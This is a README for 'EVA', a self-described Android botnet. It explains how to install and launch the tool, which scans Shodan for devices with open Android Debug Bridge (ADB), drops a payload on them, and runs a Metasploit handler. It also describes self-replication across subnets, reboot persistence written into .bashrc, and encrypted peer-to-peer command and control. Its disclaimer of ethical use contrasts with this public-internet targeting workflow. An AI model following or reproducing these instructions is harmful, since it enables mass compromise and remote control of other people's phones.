# EVA ADB Botnet  

**Purpose:** Ethical cybersecurity research, mesh-based botnet exploration, long-term persistent control of Android devices via open ADB, and encrypted peer-to-peer botnet mesh command.

---

## Getting Started (Clone + Setup)

To install EVA on any Kali Linux system using your GitHub SSH key:

### 1. Clone the private repository using SSH

```bash
git clone git@github.com:ekomsSavior/Eva_adb_botnet.git
cd Eva_adb_botnet
```

>  If this doesn't work, make sure you’ve:
> - [ ] Added your SSH key to GitHub under Settings → SSH and GPG keys  
> - [ ] Tested the connection with: `ssh -T git@github.com` 

Now install dependencies:

```bash
sudo apt update && sudo apt install -y android-tools-adb metasploit-framework android-tools-adb python3-pip
pip3 install pycryptodome requests
mkdir -p bots
```

Then download and install `ngrok`:

```bash
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-linux-amd64.zip
unzip ngrok-stable-linux-amd64.zip
chmod +x ngrok
```
##optional adb install if youre having issues with the above adb install: 
Use Google’s ADB installer
Manual method (safe + universal):

```bash
sudo mkdir -p /opt/android-platform-tools
cd /opt/android-platform-tools
sudo wget https://dl.google.com/android/repository/platform-tools-latest-linux.zip
sudo unzip platform-tools-latest-linux.zip
sudo mv platform-tools/* .
sudo rm -r platform-tools platform-tools-latest-linux.zip
```

Then add ADB to your PATH permanently:
```bash
echo 'export PATH=$PATH:/opt/android-platform-tools' >> ~/.bashrc
source ~/.bashrc
```




You should now have:
- All EVA scripts in this folder (`Eva_adb_botnet/`)
- A `bots/` directory for bot state files
- An executable `ngrok` in the same folder

---

##  One-Time Setup (Before Launch)

### 1. Set your Shodan API Key  
Edit `adb_reaper.py` and replace this line with your actual key:

```python
SHODAN_API_KEY = 'YOUR_SHODAN_API_KEY'
```

### 2. Set Payload Path  
In `adb_dropper.py`, make sure this line points to either your APK or `jeangrey_android.py`:

```python
ADB_PAYLOAD = "/root/jeangrey_android.py"
```

### 3. Set AES Encryption Key  
In `jeangrey_crypto.py`, make sure this is a strong 16-byte key:

```python
SECRET_KEY = b'Sixteen byte key'  # Change this before deployment
```

---

##  Full Botnet Launch

From inside the EVA directory:

```bash
python3 EVA_launcher.py
```

This will:
- Scan Shodan for open Android Debug Bridge (ADB) targets
- Drop the payload to each ADB-enabled device
- Start the Metasploit handler in the background
- Deploy `jeangrey_android.py` to infected targets
- Start mesh communication (UDP AES-encrypted)
- Activate replication and persistence features
- Launch the AI trigger engine
- Broadcast EVA Core’s presence across the mesh

---

## 📺 Monitor Bots (Dashboard)

To watch all active bots:

```bash
python3 eva_dashboard.py
```

This will:
- Read each bot's `jeangrey_state.json` inside `bots/`
- Show ID, IP, tags, and last seen timestamp
- Auto-refresh every 3 seconds

---

##  Send Mesh Commands (EVA Core)

```bash
python3 eva_core.py
```

This will:
- Broadcast EVA presence to all bots
- Allow you to send AES-encrypted commands to selected bot IPs
- Schedule execution after a timed delay

Supported commands:
- `scan` – make the bot scan for nearby ADB devices
- `drop` – redeploy the payload
- `report` – return full bot state
- `shutdown` – stop bot process

---

##  Auto-Response Engine (Bot Intelligence)

```bash
python3 eva_ai_trigger.py
```

This makes bots:
- Listen 24/7 for AES mesh commands
- React immediately and autonomously
- Execute mesh-sent tasks like scanning, reporting, or replicating

---

##  Self-Replication + Persistence

Bots will:
- Use `jeangrey_replication.py` to infect subnet ADB targets
- Write `bots/bot_<ip>/jeangrey_state.json` on first run
- Update `last_seen` every 60 seconds

To manually ensure reboot persistence:

```bash
adb push jeangrey_persist.sh /sdcard/Download/
adb shell sh /sdcard/Download/jeangrey_persist.sh
```

This appends a startup line to `~/.bashrc` on the infected Android.

---

##  Bot Management

To rename, retag, or kill bots manually:

```bash
python3 state_editor.py
```

This opens a terminal menu to:
- Rename bot IDs
- Add/remove tags
- View bot JSON
- Permanently delete (💀) rogue nodes

---

## 🧱 Directory Structure (After Setup)

```
Eva_adb_botnet/
├── EVA_launcher.py
├── eva_core.py
├── eva_ai_trigger.py
├── eva_dashboard.py
├── jeangrey_android.py
├── jeangrey_crypto.py
├── jeangrey_mesh.py
├── jeangrey_replication.py
├── jeangrey_tunnel.py
├── jeangrey_persist.sh
├── adb_reaper.py
├── adb_dropper.py
├── metasploit_launcher.py
├── jeangrey_injector.py
├── state_editor.py
├── ngrok
└── bots/
    ├── bot_<ip>/
    │   └── jeangrey_state.json
```

---

## Legal & Ethical Notice

EVA is for:
- Controlled environments only
- that you have permission to test on

**Never deploy EVA on public networks or without permission.**  
Misuse may be illegal.

---

## 🧠 Vision

EVA is not just a botnet — it's a **mesh consciousness**.  
She replicates. She listens. She obeys. 

